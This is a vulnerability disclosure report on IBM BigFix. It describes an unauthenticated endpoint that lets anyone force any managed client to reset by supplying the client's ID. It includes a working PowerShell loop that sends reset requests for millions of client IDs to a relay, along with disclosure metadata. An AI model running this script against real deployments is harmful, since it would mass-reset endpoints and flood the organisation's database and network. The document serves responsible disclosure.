## Overview

When a client detects an issue with it's current state it may invalidate itself by calling:

http://bigfix:52311/cgi-bin/bfenterprise/clientregister.exe?RequestType=InvalidateAndReRegisterMe

By supplying &Body=$Number after that request you can invalidate any bigfix client based on it's ID.

Resetting a client causes the client to delete all __BESData directory information, causes it to get a new client ID, and lose any manual group memberships.

The client must then evaluate all content, report back in, and will re-perform any initial provisioning tasks. It would be trivial at this point to fill the database or generate high network traffic.

Authenticating Relays is a potential mitigation but would only prevent this attack from occurring anonymously -- an attacker would need just one malicious client running BigFix to perform this attack against an authenticating relay.
Steps to Reproduce Vulnerability: Use below powershell script against a BigFix root. The higher the number of clients on the root the more effective the attack.

## Proof of Concept

Depending on the speed of the system involved you can easily do 1000 requests per second and force an organization-wide client reset within about 5 hours.
Sample PCAP/Proof of Concept/Traces or Description of Exploit/Attack Code: Powershell Script
foreach ($Number in 100000 .. 10000000) {
invoke-webrequest -uri &quot;http://bigfix-relay:52311/cgi-bin/bfenterprise/clientregister.exe?RequestType=InvalidateAndReRegisterMe&Body=$Number&quot; | out-null
if ($Number % 100 -eq 0) {write-host $Number}
}
CVE(s), if assigned:
Access Vector Required for Exploitation: Remote
Vulnerability Exists in Default Configuration?: Yes
Is the exploitation trivial or does it involve a multi-step process that may depend on user/victim interaction?: Trivial
Exploitation Requires Authentication?: No
Under what privileges does the vulnerable service or component run?: system
Requesting Public Recognition: Yes
External Public Disclosure planned?: Yes
Targeted Disclosure Date for Advisory publication: 06/01/2017
